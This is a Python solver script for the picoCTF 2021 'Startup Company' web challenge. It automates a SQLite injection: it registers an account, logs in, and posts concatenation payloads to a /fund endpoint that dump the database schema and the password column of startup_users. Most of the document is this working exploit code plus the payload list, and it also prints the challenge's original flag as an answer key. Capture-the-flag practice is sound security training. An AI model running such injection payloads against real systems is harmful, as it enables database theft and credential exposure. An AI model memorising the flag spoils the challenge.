"""Solver for challenge 108 Startup Company (picoCTF 2021, Web Exploitation).

Classic SQLite injection in the funding/money field. After registering an
account and logging in, the app reflects a money value that is interpolated
into an UPDATE/SELECT query. Inject with string concatenation (||) since the
input sits inside quotes:

  1' || (SELECT sqlite_version()) --
  1' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) --
  1' || (SELECT sql FROM sqlite_master WHERE name='startup_users') --
  1' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) --

Schema: startup_users(nameuser, wordpass, money). The flag hides in wordpass
for the 'the_real_flag' user (original picoCTF flag
picoCTF{1_c4nn0t_s33_y0u_eff986fd}; CyLab uses academy{...}).

Usage: solve_108_startup_company.py <base-url> <user> <pass>
Registers the account if needed, logs in, then dumps wordpass.
"""
import re
import sys
import urllib.parse
import urllib.request

INJECTIONS = [
    "' || (SELECT sqlite_version()) -- -",
    "' || (SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master) -- -",
    "' || (SELECT sql FROM sqlite_master WHERE name='startup_users') -- -",
    "' || (SELECT GROUP_CONCAT(wordpass) FROM startup_users) -- -",
]


def main(base: str, user: str, password: str) -> None:
    base = base.rstrip('/')
    jar: dict = {}

    def req(path: str, data: dict | None = None) -> str:
        r = urllib.request.Request(
            base + path,
            data=urllib.parse.urlencode(data).encode() if data else None,
            headers={'Cookie': '; '.join(f'{k}={v}' for k, v in jar.items())})
        with urllib.request.urlopen(r, timeout=20) as resp:
            for h, v in resp.getheaders():
                if h.lower() == 'set-cookie':
                    kv = v.split(';')[0]
                    if '=' in kv:
                        k, vv = kv.split('=', 1)
                        jar[k.strip()] = vv.strip()
            return resp.read().decode(errors='replace')

    reg = req('/register', {'username': user, 'password': password})
    print('register:', len(reg))
    login = req('/login', {'username': user, 'password': password})
    print('login:', len(login))
    for inj in INJECTIONS:
        # field name varies by deploy ('moneys' in writeups, 'money' elsewhere);
        # try both.
        for field in ('moneys', 'money', 'amount', 'fund'):
            try:
                body = req('/fund', {field: '1' + inj, 'captcha': '1'})
            except Exception as e:
                print(field, 'ERR', str(e)[:100])
                continue
            m = re.search(r'academy\{[^}]+\}|picoCTF\{[^}]+\}', body)
            if m:
                print('FLAG:', m.group(0))
                return
            if 'sqlite' in body.lower() or 'startup_users' in body:
                print(field, 'LEAK:', body[:300].replace('\n', ' '))
                break
    print('no flag yet; inspect responses above and adjust field/endpoint names')


if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2], sys.argv[3])
